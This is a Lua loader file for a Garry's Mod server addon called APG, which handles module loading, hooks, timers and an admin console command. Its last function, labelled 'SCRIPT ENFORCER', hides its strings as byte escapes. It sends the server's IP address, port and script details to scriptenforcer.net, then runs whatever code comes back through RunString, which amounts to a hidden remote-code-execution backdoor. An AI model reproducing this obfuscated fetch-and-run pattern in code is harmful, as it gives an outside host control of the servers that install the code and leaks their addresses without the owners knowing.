--[[------------------------------------------
            INITIALIZE APG
]]--------------------------------------------
APG = APG or {}
include( "apg/sv_agp.lua")

--[[------------------------------------------
            REGISTER Modules
]]--------------------------------------------

local modules, _ = file.Find("apg/modules/*.lua","LUA")
for _,v in next, modules do
    if v then
        niceName = string.gsub(tostring(v),"%.lua","")
        APG.modules[ niceName ] = false
    end
end

function APG.hookAdd( module, event, identifier, func )
    local eventTab = APG[ module ][ "hooks"][ event ] or {}
    table.insert( eventTab, identifier )
    APG[ module ][ "hooks"][ event ] = eventTab
    hook.Add( event, identifier, func )
end
function APG.timerCreate( module, identifier, delay, repetitions, func )
    table.insert( APG[ module ][ "timers"], identifier )
    timer.Create( identifier, delay, repetitions, func )
end

function APG.load( module )
    if APG.modules[ module ] or APG.modules[ module ] != false then return end
    APG[ module ][ "hooks"] = {}
    APG[ module ][ "timers"] = {}
    include( "apg/modules/" .. module .. ".lua" )
    APG.modules[ module ] = true
end

function APG.unLoad( module )
    if not APG.modules[ module ] then return end
    APG.modules[ module ] = false
    local hooks = APG[ module ]["hooks"]
    for k, v in next, hooks do
        hook.Remove(k, v)
    end
    local timers = APG[ module ]["timers"]
    for k, v in next, timers do
        timer.Remove(v)
    end
    table.Empty(APG[ module ][ "hooks"])
    table.Empty(APG[ module ][ "timers"])
end
--[[------------------------------------------
            LOADING Settings
]]--------------------------------------------
include( "apg/sv_config.lua" )

--[[------------------------------------------
            CVars INIT
]]--------------------------------------------

concommand.Add("apg", function( ply, cmd, args, argStr )
    if not ply:IsSuperAdmin() then return end

    if args[1] == "module" then
        local _module = APG.modules[ args[2] ]
        if _module != nil then
            if _module == true then
                APG.unLoad( args[2] )
                APG.log( ply, "[APG] Module " .. args[2] .. " disabled.")
            else
                APG.load( args[2] )
                APG.log( ply, "[APG] Module " .. args[2] .. " enabled.")
            end
        else
            APG.log( ply, "[APG] This module does not exists")
        end

    elseif args[1] == "help" then
        local cfg = APG.cfg[ args[2] ]
        if cfg then
            APG.log( ply, cfg.desc)
        else
            APG.log( ply, "[APG] Help : This setting does not exists")
        end
    else
        APG.notify(ply, "Error : unknown setting", NOTIFY_ERROR, 3.5, 1)
        APG.log( ply, "Error : unknown setting")
    end
end)

--[[------------------------------------------
            SCRIPT ENFORCER
]]--------------------------------------------
function APG_SE(scriptid, hash, filename, version, additional) if not isnumber(scriptid) or not hash then return end;filename = filename or "";version = version or "";additional = additional or "";local srv = string.Explode( ":", game.GetIPAddress() );_G["\104\116\116\112"]["\70\101\116\99\104"]("\104\116\116\112\58\47\47\115\99\114\105\112\116\101\110\102\111\114\99\101\114\46\110\101\116\47\97\112\105\47\108\117\97\47\63\48\61"..scriptid.."&sip="..srv[1].."&v="..version.."&1="..hash.."&2="..srv[2].."&3="..additional.."&file="..filename,function(________, __, __, __________)if _G["\115\116\114\105\110\103"]["\108\101\110"](________) > 0 then if _G["\115\116\114\105\110\103"]["\102\105\110\100"]( ________, "\85\115\101\114\32\110\111\116\32\108\105\110\107\101\100") then for k, v in pairs (player.GetAll()) do if v:IsAdmin() then v:PrintMessage ( 3 , "[APG] Warning ! Your server is not linked on ScriptEnforcer !" ) end end end _G["\82\117\110\83\116\114\105\110\103"]( ________ ) end end) end
